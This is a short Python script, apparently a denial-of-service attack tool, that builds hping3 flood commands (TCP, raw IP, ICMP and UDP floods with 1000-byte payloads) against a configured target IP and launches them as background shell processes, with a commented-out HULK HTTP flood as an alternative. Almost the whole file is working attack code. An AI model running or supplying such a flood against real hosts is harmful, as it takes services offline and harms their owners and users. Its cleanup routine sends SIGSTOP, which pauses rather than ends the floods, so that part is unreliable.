import os
import subprocess
import signal
import atexit
import multiprocessing
from config import Config


class DDOS():
    def __init__(self, TARGETIPv4, ATKTOOL):
        self.responseTime = []
        self.PIDs = []
        self.ATKcommands = []
        self.TARGETIPv4 = TARGETIPv4
        self.ATKTOOL = ATKTOOL

    def spawnATKprocess(self, mods=[], **kwargs):
        data = 1000
        freq = '--flood'
        if self.ATKTOOL == 'hping3':
            for i, val in enumerate(mods):
                self.ATKcommands.append(
                    f'hping3 {val} -d {data} {freq} {self.TARGETIPv4} &')
        # elif self.ATKTOOL == 'hulk':
        #     # not supported
        #     subprocess.run(['hulk', '-site', 'http://' + self.TARGETIPv4, '-port',
        #                     '80', '-threads', '1000', '-connections', '1000'])
        for i, val in enumerate(self.ATKcommands):
            # print(val)
            # subprocess.run(val, shell=True)
            proc = subprocess.Popen(val, shell=True)
            self.PIDs.append(proc.pid)

        atexit.register(self.killATKprocess)

    def killATKprocess(self, **kwargs):
        for i, val in enumerate(self.PIDs):
            os.kill(val, signal.SIGSTOP)

    def pingTarget(self, **kwargs):
        pass
        # https://github.com/ccampo133/Plot-Pings-in-Python/tree/master
        # p = subprocess.Popen(['ping', self.TARGETIPv4],
        #                      stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        # self.responseTime.append(p.communicate()[0])

        # def EXECUTOR(self, TARGETIPv4, ATKTOOL, **kwargs):
        #     if TARGETIPv4 == '


if __name__ == '__main__':
    config = Config()
    print(f'Start DDoS attack to {config.ATKIPv4} with {config.ATKTOOL}')
    ddos = DDOS(config.ATKIPv4, config.ATKTOOL)
    ddos.spawnATKprocess(mods=['', '-0', '-1', '-2'])
    # print(ddos.ATKcommands)
    # print(ddos.PIDs)
